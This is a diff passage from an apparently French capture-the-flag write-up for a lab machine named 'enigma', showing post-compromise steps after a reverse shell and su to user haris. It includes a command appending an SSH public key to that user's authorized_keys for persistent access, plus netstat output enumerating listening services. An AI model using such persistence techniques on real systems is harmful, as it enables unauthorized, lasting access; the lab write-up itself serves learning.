@@ -233,3 +233,65 @@ le mdp est donc bestfriends
 
 On peut pas ssh, il autorise uniquement les public key, par contre on peut passer par le reverse shell pour `su` et on trouve le premier flag dans le home de haris
 
+Puis on peut donc injecter une clé ssh dans haris pour ne plus dépendre du reverse shell (que j'ai fais crash 10 fois lol)
+
+```bash
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFoQwrjcvtZqi8WYxrycVFnirco637glPq0vZ1+M2jhf" >> /home/haris/.ssh/authorized_keys
+```
+
+Avec l'accès SSH j'utilise netstat pour lister les ports utilisé
+
+```bash
+haris@enigma:~$ netstat -lntu
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:38543           0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:47099           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:59777           0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:60039           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:49995           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN     
+tcp6       0      0 :::35991                :::*                    LISTEN     
+tcp6       0      0 :::58599                :::*                    LISTEN     
+tcp6       0      0 ::1:25                  :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN     
+tcp6       0      0 :::2049                 :::*                    LISTEN     
+tcp6       0      0 :::57379                :::*                    LISTEN     
+tcp6       0      0 :::53287                :::*                    LISTEN     
+tcp6       0      0 :::80                   :::*                    LISTEN     
+tcp6       0      0 :::110                  :::*                    LISTEN     
+tcp6       0      0 :::111                  :::*                    LISTEN     
+tcp6       0      0 :::143                  :::*                    LISTEN     
+tcp6       0      0 :::45865                :::*                    LISTEN     
+tcp6       0      0 :::993                  :::*                    LISTEN     
+tcp6       0      0 :::995                  :::*                    LISTEN     
+udp        0      0 0.0.0.0:111             0.0.0.0:*                          
+udp        0      0 0.0.0.0:49848           0.0.0.0:*                          
+udp        0      0 0.0.0.0:45764           0.0.0.0:*                          
+udp        0      0 0.0.0.0:56098           0.0.0.0:*                          
+udp        0      0 127.0.0.1:906           0.0.0.0:*                          
+udp        0      0 0.0.0.0:46171           0.0.0.0:*                          
+udp        0      0 0.0.0.0:46823           0.0.0.0:*                          
+udp        0      0 127.0.0.54:53           0.0.0.0:*                          
+udp        0      0 127.0.0.53:53           0.0.0.0:*                          
+udp        0      0 0.0.0.0:68              0.0.0.0:*                          
+udp6       0      0 :::111                  :::*                               
+udp6       0      0 :::60142                :::*                               
+udp6       0      0 :::33557                :::*                               
+udp6       0      0 :::56421                :::*                               
+udp6       0      0 :::46836                :::*                               
+udp6       0      0 :::53265                :::* 
+```
